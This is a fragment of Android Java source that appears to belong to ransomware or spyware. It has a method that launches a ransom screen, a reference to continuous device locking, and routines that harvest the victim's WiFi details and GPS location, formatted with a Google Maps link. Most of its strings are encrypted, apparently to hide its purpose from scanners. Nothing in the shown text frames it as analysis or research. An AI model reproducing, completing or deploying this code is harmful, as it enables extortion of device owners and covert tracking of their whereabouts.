            Log.d(TAG, StringHelper.decrypt("L7ml6L0kKKMfJSqrnerC/gJN0w07UNYYTooBuvAx0ACLEaCmZ7GSVuZG0QcesrELjwVBf01I4wB8LLbgUg==")); // "⚠️ Continuous locking was not active"
        }
    }

    public void showRansomDialog(Context context) {
        Intent intent = new Intent(context, RansomActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        context.startActivity(intent);
    }

    // WiFi info
    private String getWifiInfo(Context context) {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                    context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                    context.getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();

            return StringHelper.decrypt("/f+EBHHIoTMJr3ElTcX2tKXFWFnQPxzXX8HGwP/iuhPpIzcNvAI=") + //  "WiFi Info:"
                    StringHelper.decrypt("42qIDilOHP8a6WO4lNKOVqcaeLwmoqXtGv5L6ucBnX86B9w=")  + info.getSSID() + //"\nSSID: "
                    StringHelper.decrypt("BENQlXYs2IJALSn3wZ6/UNGtPys7rbw5QV+nDqKjNnlrePnN")  + info.getBSSID() + // "\nBSSID: "
                    StringHelper.decrypt("eMTRjjsTdpiKT9Xlzcm2cqvY8lnjLKfaedKP3JGgkn3Eh043pQ==")  + info.getRssi() + " dBm" + //"\nSignal: "
                    StringHelper.decrypt("1KvwVaWfZqHZCPOxZnkVpUg9VumhzBeJTbKS4mOATWwE") + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5 bars" +  //"\nIP: "
                    StringHelper.decrypt("yYTONTIWlwW6KtfWbg7P3hhIzsrNCcxkebh/H1wg3J/zrzlj76qZ1A==")  + (netInfo != null && netInfo.isConnected()); // "\nConnected: "
        } catch (Exception e) {
            return StringHelper.decrypt("itbOkde44V2YaumZdgJ3lwBhjEPZXaW5TG5qMIrxAXIGh7CxZpSFGQ8jnAO3qg==") + e.getMessage(); //  "WiFi info failed: "
        }
    }

    // Location info
    private String getLocation(Context context) {
        try {
            android.location.LocationManager lm = (android.location.LocationManager)
                    context.getSystemService(Context.LOCATION_SERVICE);

            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                    context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
                return StringHelper.decrypt("/wgOtX1YaGh30W36xzexCnKvPQzXr1vxX/WIa+xSr9hHZ4VRZ7CyAS767o9D9XiOPjED43Zbz6fiocA="); //"❌ Location permission not granted"
            }

            android.location.Location location = lm.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER);

            if (location == null) {
                location = lm.getLastKnownLocation(
                        android.location.LocationManager.NETWORK_PROVIDER);
            }

            if (location == null) return StringHelper.decrypt("7Q2nFdYvNxKpqe5m6T48hm8zm+clBpBZH7mjLjERmKn2lnN+bikbxC7lKWhoDByu") ; //"❌ Location unavailable"

            return StringHelper.decrypt("JzfOZs1SHkF8Kw3VsrnDtd0CQllGDNUeg10mqY1uOblqgRO6gg==")+ //  "Location:"
                    StringHelper.decrypt("cvZ5OG3yxMfhgG1Bwg1XIeGQMTF4nmZlxN0gEqb4R6YmSr72KJR7") + location.getLatitude() + //"\nLatitude: "
                    StringHelper.decrypt("T5aXjA/5LoP1XK1ymDLecxUOoY2j8ImfjTKNzA/tZ0pRlkb/akt8Eg==") + location.getLongitude() + //"\nLongitude: "
                    StringHelper.decrypt("xX6AbrkzJd/5mNVSrqFZ5WrMkkZt6uAEKRNWTeBYgtjBYpm3RP+7")  + location.getAccuracy() + "m" + //"\nAccuracy: "
                     "\nGoogle Maps: https://maps.google.com/?q=" +
                    location.getLatitude() + "," + location.getLongitude();

        } catch (Exception e) {
            return StringHelper.decrypt("Jt/xgvYFInX+cMh5wdyHx2jcC6hmbpFQyv51o++cgUlWRYu1KmW1oHq7zloD") + e.getMessage(); // "Location failed: "
        }
    }



}